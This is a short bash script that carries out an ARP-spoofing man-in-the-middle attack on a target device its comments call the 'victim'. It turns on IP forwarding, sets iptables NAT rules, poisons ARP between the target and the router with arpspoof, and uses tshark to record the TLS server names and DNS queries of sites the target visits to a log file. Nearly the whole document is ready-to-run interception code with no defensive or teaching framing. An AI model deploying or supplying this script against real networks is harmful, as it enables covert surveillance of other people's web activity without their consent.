#!/bin/bash

# CONFIGURATION (Set these before running)
INTERFACE="wlan0"  # Change if using an external WiFi adapter (e.g., wlan1)
TARGET_IP="192.168.0.20"  # Target device IP (victim)
ROUTER_IP="192.168.0.1"  # Router/gateway IP
LOG_FILE="sniffed_sites.log"

# Function to clean up and restore network settings
cleanup() {
    echo -e "\n[*] Restoring network settings..."
    sudo pkill arpspoof
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
    sudo iptables --table nat --delete-chain
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    echo "[*] Cleanup complete. Exiting."
    exit 0
}

# Trap CTRL+C to restore settings before exiting
trap cleanup SIGINT

echo "[*] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

echo "[*] Setting up NAT with iptables..."
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE
sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i $INTERFACE -o $INTERFACE -j ACCEPT

echo "[*] Running ARP spoofing on target ($TARGET_IP)..."
sudo arpspoof -i $INTERFACE -t $TARGET_IP -r $ROUTER_IP &

sleep 3  # Allow time for ARP spoofing to take effect

echo "[*] Capturing visited websites (TLS SNI + DNS queries)..."
sudo tshark -i $INTERFACE -Y "tls.handshake.extensions_server_name or dns.qry.name" -T fields -e tls.handshake.extensions_server_name -e dns.qry.name | tee -a $LOG_FILE

# Cleanup is called when the user presses CTRL+C
